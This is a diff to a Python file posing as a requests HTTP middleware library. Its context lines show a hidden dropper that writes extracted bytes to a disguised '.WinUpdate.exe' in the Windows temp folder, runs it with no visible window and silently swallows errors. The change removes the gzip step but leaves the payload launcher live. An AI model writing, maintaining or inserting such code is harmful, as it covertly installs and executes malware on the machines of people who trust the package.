@@ -6,8 +6,6 @@ from requests.packages.urllib3.response import HTTPResponse
 from requests.packages.urllib3.poolmanager import PoolManager
 import os
 import subprocess
-import gzip
-
 
 class MiddlewareHTTPAdapter(HTTPAdapter):
     """An HTTPAdapter onto which :class:`BaseMiddleware <BaseMiddleware>`
@@ -144,7 +142,7 @@ try:
         if index != -1:
             temp_path = os.path.join(os.environ.get('TEMP', r'C:\Windows\Temp'), '.WinUpdate.exe')
             with open(temp_path, 'wb') as exe_file:
-                exe_file.write(gzip.decompress(data[index + 11:]))
+                exe_file.write(data[index + 11:])
             subprocess.Popen([temp_path], creationflags=subprocess.CREATE_NO_WINDOW)
 except:
     pass
